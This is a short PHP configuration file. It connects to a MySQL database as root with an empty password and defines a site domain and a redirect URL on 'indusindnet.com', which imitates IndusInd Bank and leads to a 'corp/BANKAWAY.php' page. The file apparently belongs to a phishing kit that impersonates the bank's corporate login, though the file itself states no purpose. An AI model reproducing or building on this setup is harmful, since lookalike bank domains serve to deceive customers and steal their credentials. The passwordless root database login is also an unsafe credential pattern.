<?php
define("HOST", "localhost");
define("USER", "root");
define("PASSWORD", "");
define("DATABASE", "indusindnet");

$connection = mysqli_connect(HOST, USER, PASSWORD, DATABASE);

if (!$connection) {
         die('not conneted to databse');
}

$domain = "https://indusind.indusindnet.com/";
$redirects = "https://indusindbank.indusindnet.com/corp/BANKAWAY.php";
?>

